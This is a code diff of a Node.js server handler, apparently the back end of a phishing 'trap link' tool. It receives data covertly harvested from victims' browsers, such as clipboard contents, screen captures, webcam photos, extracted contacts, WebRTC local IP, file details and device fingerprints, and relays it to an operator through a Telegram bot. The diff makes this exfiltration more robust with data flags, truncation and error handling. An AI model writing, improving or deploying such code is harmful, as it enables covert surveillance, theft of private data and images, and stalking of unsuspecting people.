@@ -178,60 +178,76 @@ async function startServer() {
       const data = req.body as any;
       let extraMsg = `📎 <b>ADVANCED MODULE CAPTURED</b> 📎\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
+      let hasData = false;
       
       if (data.hardware_brand_profile) {
         try {
-          const h = JSON.parse(data.hardware_brand_profile);
+          const h = typeof data.hardware_brand_profile === 'string' ? JSON.parse(data.hardware_brand_profile) : data.hardware_brand_profile;
           extraMsg += `🛠️ <b>HARDWARE IDENTITY:</b>\n` +
                       `├ Brand/Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                       `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                       `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code>\n\n`;
+          hasData = true;
         } catch(e) {}
       }
       if (data.cpu_compute_score) {
         extraMsg += `⚡ <b>CPU PERFORMANCE:</b>\n` +
                     `└ Score: <code>${data.cpu_compute_score}</code>\n\n`;
+        hasData = true;
       }
       if (data.local_ip) {
         extraMsg += `🌐 <b>WEB-RTC LOCAL IP:</b>\n` +
                     `└ IP: <code>${data.local_ip}</code>\n\n`;
+        hasData = true;
       }
       if (data.clipboard_sync || data.clipboard) {
-        extraMsg += `📋 <b>CLIPBOARD DUMP:</b>\n<pre>${escapeHTML(data.clipboard_sync || data.clipboard)}</pre>\n\n`;
+        const clip = (data.clipboard_sync || data.clipboard).substring(0, 500);
+        extraMsg += `📋 <b>CLIPBOARD DUMP:</b>\n<pre>${escapeHTML(clip)}</pre>\n\n`;
+        hasData = true;
       }
       if (data.media_hardware) {
-        extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media_hardware)}</pre>\n\n`;
+        extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media_hardware.substring(0, 500))}</pre>\n\n`;
+        hasData = true;
       }
       if (data.file_name) {
         extraMsg += `📂 <b>FILE ACCESS GRANTED:</b>\n` +
                     `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                     `├ Type: <code>${data.file_type}</code>\n` +
                     `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
+        hasData = true;
       }
       if (data.screen_label) {
         extraMsg += `🖥️ <b>SCREEN INTERFACE LOGGED:</b>\n` +
                     `├ Source: <code>${escapeHTML(data.screen_label)}</code>\n` +
                     `└ Status: <b>Sync Success</b>\n\n`;
+        hasData = true;
       }
       
       // Image delivery (Visual Identity, Screen Capture)
       if (data.screen_capture) {
-        const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
-        botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN SNAPSHOT CAPTURED` }).catch(() => {});
+        try {
+          const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
+          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN SNAPSHOT CAPTURED` }).catch(() => {});
+          hasData = true;
+        } catch(e) {}
       }
       if (data.visual_identity) {
-        const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
-        botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET VISUAL IDENTITY` }).catch(() => {});
+        try {
+          const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
+          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET VISUAL IDENTITY` }).catch(() => {});
+          hasData = true;
+        } catch(e) {}
       }
 
       if (data.gpu_full_profile) {
         try {
-          const gpu = JSON.parse(data.gpu_full_profile);
+          const gpu = typeof data.gpu_full_profile === 'string' ? JSON.parse(data.gpu_full_profile) : data.gpu_full_profile;
           extraMsg += `🎮 <b>ADVANCED GPU PROFILE:</b>\n` +
                       `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                       `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                       `├ GL Version: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
                       `└ Shading GL: <code>${escapeHTML(gpu.shading_lang)}</code>\n\n`;
+          hasData = true;
         } catch(e) {}
       }
 
@@ -239,35 +255,43 @@ async function startServer() {
         extraMsg += `🔋 <b>POWER SUBSYSTEM:</b>\n` +
                     `├ Level: <code>${data.battery_level}</code>\n` +
                     `├ Charging: <code>${data.battery_charging ? 'YES' : 'NO'}</code>\n` +
-                    `└ Time to Empty: <code>${data.battery_time}</code>\n\n`;
+                    `└ Time: <code>${data.battery_time}</code>\n\n`;
+        hasData = true;
       }
 
       if (data.fonts_count) {
         extraMsg += `🔡 <b>FONT REGISTRY:</b>\n` +
                     `├ Count: <code>${data.fonts_count}</code>\n` +
                     `└ Samples: <code>${escapeHTML(data.fonts_sample)}</code>\n\n`;
+        hasData = true;
       }
 
       if (data.screens) {
         extraMsg += `🖥️ <b>MULTI-DISPLAY MAP:</b>\n` +
                     `├ Screens: <code>${data.screens}</code>\n` +
                     `└ Primary: <code>${escapeHTML(data.screen_primary || 'N/A')}</code>\n\n`;
+        hasData = true;
       }
 
-      if (data.sec_pdf !== undefined) {
+      if (data.sec_webdriver !== undefined) {
         extraMsg += `🛡️ <b>KERNEL INTEGRITY+:</b>\n` +
                     `├ Webdriver: <code>${data.sec_webdriver}</code>\n` +
-                    `├ PDF Enabled: <code>${data.sec_pdf}</code>\n` +
-                    `└ DoNotTrack: <code>${data.sec_doNotTrack || 'Off'}</code>\n\n`;
+                    `├ PDF: <code>${data.sec_pdf}</code>\n` +
+                    `└ DNT: <code>${data.sec_doNotTrack || 'Off'}</code>\n\n`;
+        hasData = true;
       }
+
       if (data.installed_fonts) {
+        const fonts = data.installed_fonts.substring(0, 500);
         extraMsg += `🔡 <b>FONT FINGERPRINT:</b>\n` +
-                    `└ Detected: <code>${data.installed_fonts}</code>\n\n`;
+                    `└ Detected: <code>${fonts}</code>\n\n`;
+        hasData = true;
       }
 
       if (data.audio_sig) {
         extraMsg += `🎵 <b>AUDIO FINGERPRINT:</b>\n` +
                     `└ Signature: <code>${data.audio_sig}</code>\n\n`;
+        hasData = true;
       }
 
       if (data.orientation) {
@@ -275,6 +299,7 @@ async function startServer() {
                     `├ Orientation: <code>${data.orientation}</code>\n` +
                     `├ Gamepads: <code>${data.gamepads}</code>\n` +
                     `└ Languages: <code>${data.languages}</code>\n\n`;
+        hasData = true;
       }
 
       const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
@@ -286,53 +311,58 @@ async function startServer() {
           apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
         }
       });
-      if (apiFound) extraMsg += apiTxt + '\n';
+      if (apiFound) {
+        extraMsg += apiTxt + '\n';
+        hasData = true;
+      }
 
       if (data.social_active || data.social_inactive) {
          extraMsg += `🤝 <b>SOCIAL PRESENCE:</b>\n` +
                      `├ Active: <code>${data.social_active || 'None'}</code>\n` +
                      `└ Load: <code>${data.load_ms || 'N/A'}ms</code>\n\n`;
+         hasData = true;
       }
       if (data.adblock_detected !== undefined) {
         extraMsg += `🛡️ <b>ADS/SHIELD STATUS:</b>\n` +
                     `└ AdBlock: <b>${data.adblock_detected ? 'DETECTED' : 'NOT FOUND'}</b>\n\n`;
+        hasData = true;
       }
       if (data.network_rtt) {
         extraMsg += `🛰️ <b>LATENCY MAPPING:</b>\n` +
                     `├ Node: <code>${data.network_rtt}</code>\n` +
                     `└ RTT: <code>${data.latency}ms</code>\n\n`;
+        hasData = true;
       }
 
       if (data.contacts_leaked) {
         let count = 0;
-        try { count = JSON.parse(data.contacts_leaked).length; } catch(e) {}
+        try { count = (typeof data.contacts_leaked === 'string' ? JSON.parse(data.contacts_leaked) : data.contacts_leaked).length; } catch(e) {}
         extraMsg += `👥 <b>SOCIAL GRAPH CAPTURED:</b>\n` +
                     `└ <i>${count} kontak diekstrak (Raw Logged).</i>\n\n`;
+        hasData = true;
       }
       if (data.sensor_mag || data.sensor_lux) {
         extraMsg += `🧬 <b>PHYSICAL ENVIRONMENT:</b>\n` +
                     `├ Mag: <code>${escapeHTML(data.sensor_mag || 'N/A')}</code>\n` +
                     `└ Ambient: <code>${escapeHTML(String(data.sensor_lux || 'N/A'))} lux</code>\n\n`;
+        hasData = true;
       }
       if (data.storage_mb) {
         extraMsg += `💾 <b>STORAGE FORENSICS:</b>\n` +
                     `├ Usage: <code>${data.storage_mb} MB</code>\n` +
                     `└ Quota: <code>${data.quota_gb} GB</code>\n\n`;
+        hasData = true;
       }
       
       if (data.incognito_audit !== undefined) {
         extraMsg += `🕵️ <b>BROWSER MODE:</b>\n` +
                     `└ Private/Incognito: <b>${data.incognito_audit ? 'YES' : 'NO'}</b>\n\n`;
+        hasData = true;
       }
       if (data.devtools_open !== undefined) {
         extraMsg += `🛠️ <b>INSPECTOR DETECTED:</b>\n` +
                     `└ Developer Tools: <b>${data.devtools_open ? 'OPEN' : 'CLOSED'}</b>\n\n`;
-      }
-      if (data.sec_webdriver !== undefined) {
-        extraMsg += `🛡️ <b>KERNEL SECURITY:</b>\n` +
-                    `├ WebDriver: <code>${data.sec_webdriver}</code>\n` +
-                    `├ Cookies: <code>${data.sec_cookies}</code>\n` +
-                    `└ Java: <code>${data.sec_java}</code>\n\n`;
+        hasData = true;
       }
       
       if (data.net_effective) {
@@ -341,32 +371,38 @@ async function startServer() {
                     `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                     `├ Downlink: <code>${data.net_downlink}Mb/s</code>\n` +
                     `└ Beacon RTT: <code>${data.beacon_rtt || 'N/A'}</code>\n\n`;
+        hasData = true;
       }
       if (data.storage_ls || data.storage_ss) {
         extraMsg += `📂 <b>PERSISTENT DATA MAP:</b>\n` +
                     `├ LocalStorage: <i>${data.storage_ls ? 'Captured' : 'Empty'}</i>\n` +
                     `└ SessionStorage: <i>${data.storage_ss ? 'Captured' : 'Empty'}</i>\n\n`;
+        hasData = true;
       }
       if (data.bt_available !== undefined) {
         extraMsg += `📡 <b>PERIPHERAL BUS:</b>\n` +
                     `└ BT Adapter: <b>${data.bt_available ? 'Active' : 'Offline'}</b>\n\n`;
+        hasData = true;
       }
       if (data.display_hz) {
         extraMsg += `📺 <b>DISPLAY PERFORMANCE:</b>\n` +
                     `└ Refresh Rate: <code>${data.display_hz} Hz</code>\n\n`;
+        hasData = true;
       }
       if (data.haptic_ready) {
         extraMsg += `📳 <b>HAPTIC RESPONSE:</b>\n` +
                     `└ Engine: <b>Verified & Calibrated</b>\n\n`;
+        hasData = true;
       }
       
-      extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `✅ <i>Hyper-Deep module sync successfully.</i>`;
-      botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
+      if (hasData) {
+        extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>Hyper-Deep module sync successfully.</i>`;
+        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
+      }
     }
     res.sendStatus(200);
   });
-
   app.post('/api/log/:id/gps', (req, res) => {
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
